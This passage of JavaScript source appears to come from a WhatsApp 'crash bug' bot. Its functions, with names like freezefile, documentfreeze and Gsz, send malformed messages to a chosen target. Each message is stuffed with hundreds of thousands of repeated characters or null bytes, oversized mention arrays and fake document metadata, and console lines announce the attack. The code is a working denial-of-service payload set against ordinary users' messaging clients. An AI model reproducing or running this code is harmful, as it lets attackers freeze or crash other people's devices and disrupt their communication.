g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ҉          𖣂𓍯̤\n" + "\n\n\n\n\n\n\n\n\n\n\n\n@6282332790754".repeat(27000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{}"
            },
            contextInfo: {
              mentionedJid: ["6282332790754@s.whatsapp.net"],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: ""
                }
              }
            }
          }
        }
      }
    }, zLoc ? {
      participant: {
        jid: zLoc
      }
    } : {});
    console.log(chalk.green("Send Bug By ⭑‌▾ ⿻ CelaCrash ⿻ ▾⭑"));
  }
async function freezefile(zLoc, ptcp = false) {
    let virtex = "🌸͜͞.⃟  𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈⃤🌿" + "@1".repeat(250000);
    await bad.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "🌿͜͞.⃟  𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈⃤🌸",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
} 
    
async function xPokers(zLoc, ptcp = false) {
    let virtex = ".⃟  𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈⃤☠️" + "@6282291664759".repeat(25000);
    await bad.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "🦠.⃟  𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈⃤☠️",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "6282291664759@s.whatsapp.ney"),
                        groupMentions: [{ groupJid: "6282291664759@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}
		
async function xTravas(zLoc, ptcp = false) {
    let virtex = "Scarlet";
    let buttons = Array.from({ length: 200 }, () => ({
        name: 'call_permission_request',
        buttonParamsJson: '{}'
    }));
    let overJids = Array.from({ length: 1039900 }, () => zLoc);
    
    await bad.relayMessage(zLoc, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: virtex,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Xinn " }]
                    }
                }
            }
        },
        contextInfo: {
            mentionedJid: overJids,
            externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: false,
                title: `-> .⃟  𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈⃤ `,
                body: `—??`,
                previewType: "VIDEO",
                thumbnail: "",
                sourceUrl: "https://byxzmods.com",
                mediaUrl: "https://byxzmods.com"
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}


async function Vulcanicx(zLoc, ptcp = false) {
    let virtex = "Cela " + "ꦾ".repeat(40000);
    await bad.relayMessage(zLoc, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: virtex,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {
                        buttons: Array(20).fill({
                            name: 'call_permission_request',
                            buttonParamsJson: '{}'
                        })
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}
        
        
async function NullX(zLoc, ptcp = false) {
    await bad.relayMessage(zLoc, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " Halo Bro ",
                            format: "EXTENSIONS_1"
                        },
                        nativeFlowResponseMessage: {
                            name: 'galaxy_message',
                            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(amount)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                            version: 3
                        }
                    }
                }
            }
        }, 
        ptcp ? { participant: { jid: zLoc } } : {}
    );
};
async function bakdok(zLoc, ptcp = false) {
 var etc = generateWAMessageFromContent(zLoc, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `Scarlet DOCUMENT`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: zLoc, quoted: ptcp });
await bad.relayMessage(target, etc.message, { participant: { jid: zLoc }, messageId: etc.key.id });
}
async function CallMsg(zLoc, ptcp = false) {
    await bad.relayMessage(zLoc, {
                        "messageContextInfo": {
                            "messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
                            "deviceListMetaData": {},
                            "deviceListMetadataVersion": 2
                        },
                        "scheduledCallCreationMessage": {
                            "scheduledTimestampMs": '1200',
                            callType: "AUDIO",
                            "title": ' # TrashDex - Explanation ' + '❗'.repeat(20000),
                        }
                    }, {
                        additionalAttributes: {
                            edit: '7'
                        }
                    })
                }


async function CaroUsel(zLoc, ptcp = false) {
      let etc = generateWAMessageFromContent(
        zLoc,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  locationMessage: {},
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⭑‌Scarlet Crash ‌",
                },
                nativeFlowMessage: {
                  name: "call_permission_request",
                  messageParamsJson: " ꦾ ",
                },
                carouselMessage: {},
              },
            },
          },
        }),
        {
          userJid: zLoc,
          quoted: m
        }
      );

      await bad.relayMessage(
        zLoc,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: zLoc,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By ⭑‌▾ ⿻ CelaCrash ⿻ ▾⭑"));
    }
    
		async function TanggapanDiterima(zLoc, ptcp = false) {
			await bad.relayMessage(zLoc, {
					viewOnceMessage: {
						message: {
							interactiveResponseMessage: {
								body: {
									text: "ScarletNuLL",
									format: "EXTENSIONS_1"
								},
								nativeFlowResponseMessage: {
									name: 'galaxy_message',
									paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zetxcza.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
									version: 3
								}
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: zLoc
					}
				} : {}
			);
			console.log(chalk.green("Scarlet Attacked Someone! 😴"));
		};
		
  async function uidoc(zLoc, ptcp = false) {
    let uitext = "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈𝘼𝙩𝙩𝙖𝙘𝙠 𝙐𝙞" + "𑲭𑲭".repeat(50000);
    await bad.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/pdf',
                            fileSha256: "NpR4V+tVc+N2p3zZgKO9Zzo/I7LrhNHlJxyDBxsYJLo=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "6l+ksifBQsLHuJJGUs5klIE98Bv7usMDwGm4JF2rziw=",
                            fileName: "unidentifiedMessageType",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: uitext
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Xin x9 " }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}
    
    // Freeze Speciality //
     async function locasiV2(zLoc, ptcp = false) {
   let mark = '0@s.whatsapp.net';
    await bad.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈" + "ꦾ".repeat(1099)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function locasifreeze(zLoc, ptcp = false) {
    await bad.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Cela" + "@1".repeat(295000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function documentfreeze(zLoc, ptcp = false) {
    let uitext = ".⃟  𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈⃤ " + "*~@1~*".repeat(50000);
    await bad.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30473509_1487882801880114_6053807656786168970_n.enc?ccb=11-4&oh=01_Q5AaIAjozZG-7ebt_0VTalQg3jMRpk7lgF-rRdrUZ3BblPGJ&oe=676B61B9&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                            fileSha256: "dnFCD9DtW/8seNK1KK9RFO/qR7ODsmBI/fkfkybi55s=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "6l+ksifBQsLHuJJGUs5klIE98Bv7usMDwGm4JF2rziw=",
                            fileName: ".⃟  𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈⃤",
                            fileEncSha256: "0IrI30eGq8SQ0KSAmUWpPFCr9CIvoZRC/0PFbulTsFU=",
                            directPath: "/v/t62.7119-24/30473509_1487882801880114_6053807656786168970_n.enc?ccb=11-4&oh=01_Q5AaIAjozZG-7ebt_0VTalQg3jMRpk7lgF-rRdrUZ3BblPGJ&oe=676B61B9&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1732511963",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: uitext
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "footer" }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function documentfreeze2(zLoc, ptcp = false) {
    let uitext = "Scarlet" +  "꧀ *~@1~*".repeat(50000);
    await bad.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30509355_1747184032799742_6644078360623643154_n.enc?ccb=11-4&oh=01_Q5AaIPoclG-9z7kzCK-pmRgL9Ss5OAsStWN10HK02vW8OfFg&oe=676BC4FC&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
                            fileSha256: "7SXMgNYBO4tkPSk3W46FQ3hUcK6K6G3//TiB5/ibhwg=",
                            fileLength: "829710112",
                            pageCount: 0x9184e729fff,
                            mediaKey: "/gaasVF/Lt68CK4sy5DTRhJDQls+RwNDwU6yhGZjPCk=",
                            fileName: "@Scarlet💸",
                            fileEncSha256: "nRvyfj/ky0+6upJrQMnwtuXm6lye2RuavfYM+cVl0hU=",
                            directPath: "v/t62.7119-24/30509355_1747184032799742_6644078360623643154_n.enc?ccb=11-4&oh=01_Q5AaIPoclG-9z7kzCK-pmRgL9Ss5OAsStWN10HK02vW8OfFg&oe=676BC4FC&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1732537847",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: uitext
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "footer" }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}


    async function Gsz(zLoc, ptcp = false) {
      await bad.relayMessage(
        zLoc,
        {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  locationMessage: {},
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⚝𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈Foryou⚝" + "\u0000".repeat(900000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "",
                },
                carouselMessage: {},
              },
            },
          },
        },
        {
          participant: {
            jid: zLoc,
          },
        }
      );
      console.log(chalk.green("Send Bug By ⭑‌▾ ⿻ CelaCrash ⿻ ▾⭑"));
    }
    
async function uidoc2(zLoc, ptcp = false) {
    let akumw = "~Crash~" + "ꦿꦾ".repeat(50000);
    await bad.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: " .⃟  𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈⃤ ",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: akumw
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Credits to xin bro " }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function liveLokFreeze(zLoc, ptcp = false) {
        let xcl = "ꪶ𖣂ꫂ x𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈 厷"+"𑲭𑲭".repeat(77777) + "@1".repeat(77777);
var etc = generateWAMessageFromContent(zLoc, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": xcl,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     },
     body: {
     text: "virtex"
     },
     nativeFlowMessage: {},
     contextInfo: {
     mentionedJid: ["6285805338638@s.whatsapp.net"],
